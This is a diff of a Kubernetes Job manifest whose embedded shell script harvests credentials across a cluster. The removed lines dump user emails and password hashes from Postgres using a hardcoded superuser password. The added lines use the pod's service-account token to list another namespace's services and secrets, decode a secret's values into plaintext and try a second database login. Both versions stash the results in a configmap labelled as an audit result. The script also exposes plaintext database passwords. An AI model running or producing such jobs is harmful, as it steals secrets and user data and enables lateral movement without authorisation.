@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-db-v13
+  name: dune-db-v14
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -16,46 +16,45 @@ spec:
         args:
         - |
           apk add -q postgresql-client jq
-          PG_HOST="172.16.10.14"
-          SUPER_PASS="wpEJl3WKOImARD9WgBsa"
-          
-          echo "=TACHCORP_USERS_SCHEMAS=" > /tmp/out.txt
-          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d tachcorp_db -c \
-            "SELECT table_schema, table_name FROM information_schema.tables WHERE table_name='users' ORDER BY table_schema;" >> /tmp/out.txt 2>&1
-          
-          echo "=TACHCORP_DUNE_USERS=" >> /tmp/out.txt
-          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d tachcorp_db -c \
-            "SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_name='users' ORDER BY table_schema, ordinal_position;" >> /tmp/out.txt 2>&1
-          
-          echo "=TACHCORP_ALL_SCHEMAS=" >> /tmp/out.txt
-          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d tachcorp_db -c \
-            "\dn" >> /tmp/out.txt 2>&1
-          
-          # Query users from each schema
-          echo "=TACHCORP_USERS_DATA=" >> /tmp/out.txt
-          for SCHEMA in tachcorp dune api auth public; do
-            COUNT=$(PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d tachcorp_db -tAc \
-              "SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users' AND table_schema='$SCHEMA';" 2>/dev/null)
-            if [ "$COUNT" = "1" ]; then
-              echo "--- schema $SCHEMA ---" >> /tmp/out.txt
-              PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d tachcorp_db -c \
-                "SELECT id, email, is_superuser, is_active, hashed_password FROM ${SCHEMA}.users LIMIT 10;" >> /tmp/out.txt 2>&1
-            fi
-          done
-          
-          # Also check n8n database schema  
-          echo "=N8N_DB_TABLES=" >> /tmp/out.txt
-          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d n8n -c "\dt" >> /tmp/out.txt 2>&1
-          
-          cat /tmp/out.txt
           
           API="https://kubernetes.default.svc"
           CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
           TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          
+          echo "=DUNE_NS_SERVICES=" > /tmp/out.txt
+          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
+            "$API/api/v1/namespaces/dune-api/services" | jq -r '.items[] | .metadata.name + " " + (.spec.clusterIP // "none") + " " + (.spec.ports[]?.port|tostring)' >> /tmp/out.txt 2>&1
+          
+          echo "=DUNE_NS_CONFIGMAPS=" >> /tmp/out.txt
+          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
+            "$API/api/v1/namespaces/dune-api/configmaps" | jq -r '.items[] | .metadata.name' >> /tmp/out.txt 2>&1
+          
+          echo "=DUNE_NS_SECRETS=" >> /tmp/out.txt
+          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
+            "$API/api/v1/namespaces/dune-api/secrets" | jq -r '.items[] | .metadata.name' >> /tmp/out.txt 2>&1
+          
+          echo "=DUNE_ENV_SECRET=" >> /tmp/out.txt
+          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
+            "$API/api/v1/namespaces/dune-api/secrets/dune-api-env" 2>/dev/null | jq -r '.data | to_entries[] | .key + "=" + (.value | @base64d)' >> /tmp/out.txt 2>&1
+          
+          # Try connecting to dune-api postgres services
+          echo "=DUNE_PG_SERVICES=" >> /tmp/out.txt
+          # Check if there's a postgres service in dune-api namespace
+          PG_SVC=$(curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
+            "$API/api/v1/namespaces/dune-api/services" | jq -r '.items[] | select(.spec.ports[]?.port == 5432) | .metadata.name + "." + .metadata.namespace + ".svc.cluster.local"')
+          echo "PG services in dune-api: $PG_SVC" >> /tmp/out.txt
+          
+          if [ -n "$PG_SVC" ]; then
+            PGPASSWORD="psJVV0VTF66hHUcH" psql -h "$PG_SVC" -p 5432 -U duneuser -c "\l" >> /tmp/out.txt 2>&1
+          fi
+          
+          cat /tmp/out.txt
+          
           PAYLOAD=$(jq -n --rawfile content /tmp/out.txt '{"data":{"result":$content}}')
           curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
             -H "Content-Type: application/merge-patch+json" \
             -X PATCH "$API/api/v1/namespaces/default/configmaps/dune-audit-result3" \
             -d "$PAYLOAD" > /tmp/patch.txt
           echo "Patched: $(cat /tmp/patch.txt | jq -r '.metadata.name // .message')"
+          
           sleep 90
